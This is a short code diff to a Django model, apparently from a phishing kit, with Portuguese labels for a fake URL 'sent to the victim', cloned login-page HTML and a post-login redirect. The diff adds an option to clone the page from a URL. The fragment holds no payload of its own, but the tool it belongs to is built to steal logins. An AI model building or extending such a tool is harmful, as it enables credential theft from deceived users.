@@ -13,7 +13,8 @@ class TemplateCopy(models.Model):
     url_fake = models.CharField(verbose_name='URL que será enviada para a vítima', max_length=200, unique=True, help_text="Ex: site.com/aqui o nome do seu link/")
     content = models.TextField(verbose_name='HTML da página', blank=True, null=True)
     redirect = models.CharField(verbose_name='Para onde redirecionar após login', max_length=500, blank=True, null=True, help_text='Se deixar vazio, irá redirecionar para a própria tela de login')
-
+    copy_from_url = models.BooleanField(verbose_name="Marque se for para clonar da URL", default=True, help_text="Se deixar desmarcado, irá clonar do campo acima 'HTML da página'")
+    
     def __str__(self):
         return self.title
 
